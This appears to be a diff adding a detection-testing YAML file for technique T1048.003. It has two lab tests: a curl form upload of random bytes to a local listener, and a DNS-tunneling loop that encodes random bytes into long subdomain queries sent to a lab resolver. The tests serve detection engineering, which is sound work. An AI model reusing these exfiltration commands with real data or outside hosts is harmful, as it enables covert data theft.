@@ -1,0 +1,63 @@
+attack_technique: T1048.003
+display_name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol'
+atomic_tests:
+- name: DAC - curl form upload of a dummy file to a lab HTTP listener
+  auto_generated_guid: d0d99f3d-3ff7-402a-bcd6-badbce96e26f
+  description: |
+    Creates 4 KB of random bytes (no real data) and uploads it with `curl -F file=@...` to a
+    lab listener. The upload does not need to succeed - the process-creation event is what
+    the rule detects. Optionally run `python3 -m http.server 8000` on the target first.
+    Triggers: proc_creation_lnx_curl_wget_file_upload.
+  supported_platforms:
+  - linux
+  input_arguments:
+    target_host:
+      description: Lab receiver (RFC 1918 / loopback only)
+      type: string
+      default: 127.0.0.1
+    target_port:
+      description: Receiver port
+      type: integer
+      default: 8000
+  executor:
+    command: |
+      head -c 4096 /dev/urandom > /tmp/dac-exfil-test.bin
+      curl -s -m 5 -F "file=@/tmp/dac-exfil-test.bin" "http://#{target_host}:#{target_port}/upload" -o /dev/null || true
+    cleanup_command: |
+      rm -f /tmp/dac-exfil-test.bin
+    name: sh
+    elevation_required: false
+- name: DAC - Encode a dummy file into DNS queries to a lab resolver
+  auto_generated_guid: 144075e7-d166-479d-a8a1-94b32541b3d2
+  description: |
+    LAB MODE. Base32-encodes 120 random bytes into 50-character labels and queries
+    <chunk>.t1.<zone> against the lab resolver - the on-the-wire pattern of DNS tunneling
+    tools. The queries must cross the Zeek-monitored segment, so a loopback resolver
+    (127.0.0.53) will NOT work. Use a lab resolver WITHOUT upstream forwarding so nothing
+    leaves the lab; the default zone uses the reserved .example TLD.
+    Triggers: zeek_dns_long_subdomain_tunneling.
+  supported_platforms:
+  - linux
+  input_arguments:
+    resolver:
+      description: Lab DNS resolver on the monitored segment (RFC 1918 only)
+      type: string
+      default: 10.10.0.53
+    zone:
+      description: Tunnel zone (reserved TLD, never delegated)
+      type: string
+      default: tunnel.example
+  dependency_executor_name: sh
+  dependencies:
+  - description: dig (dnsutils) must be installed
+    prereq_command: |
+      command -v dig >/dev/null 2>&1
+    get_prereq_command: |
+      sudo apt-get install -y dnsutils
+  executor:
+    command: |
+      head -c 120 /dev/urandom | base32 | tr -d '=\n' | fold -w 50 | while read -r chunk; do
+        dig +short +time=1 +tries=1 "@#{resolver}" "${chunk}.t1.#{zone}" TXT || true
+      done
+    name: sh
+    elevation_required: false
